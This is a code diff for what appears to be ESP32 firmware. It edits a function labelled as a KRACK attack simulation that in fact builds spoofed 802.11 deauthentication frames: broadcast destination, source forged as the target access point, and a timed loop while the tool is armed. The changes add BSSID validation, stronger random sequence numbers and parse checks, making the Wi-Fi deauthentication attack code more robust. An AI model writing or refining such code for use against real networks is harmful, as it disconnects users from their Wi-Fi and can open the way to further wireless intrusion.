@@ -41,16 +41,29 @@ KrackResult simulateKRACKattack(const String &bssid, uint8_t channel, uint16_t d
 
     unsigned long startTime = millis();
 
+    // Validate BSSID format once
+    if (bssid.length() != 17) {  // "AA:BB:CC:DD:EE:FF" = 17 chars
+        Serial.println("Error: Invalid BSSID format (expected AA:BB:CC:DD:EE:FF)");
+        result.error = "Invalid BSSID format";
+        return result;
+    }
+
     while (millis() - startTime < durationMs && attacking && TxArm::isArmed()) {
         DeauthFrame frame;
         frame.frame_control = 0xc0;
         frame.duration = 0;
-        frame.seq_ctrl = (rand() % 4096) << 4;
+        frame.seq_ctrl = (esp_random() % 4096) << 4;  // Use esp_random instead of rand()
         frame.reason_code = 7;
 
-        sscanf(bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+        int n = sscanf(bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
             &frame.bssid[0], &frame.bssid[1], &frame.bssid[2],
             &frame.bssid[3], &frame.bssid[4], &frame.bssid[5]);
+
+        if (n != 6) {
+            Serial.println("Error: Failed to parse BSSID");
+            memset(frame.bssid, 0, 6);
+            break;
+        }
 
         memset(frame.da, 0xff, 6);
         memcpy(frame.sa, frame.bssid, 6);
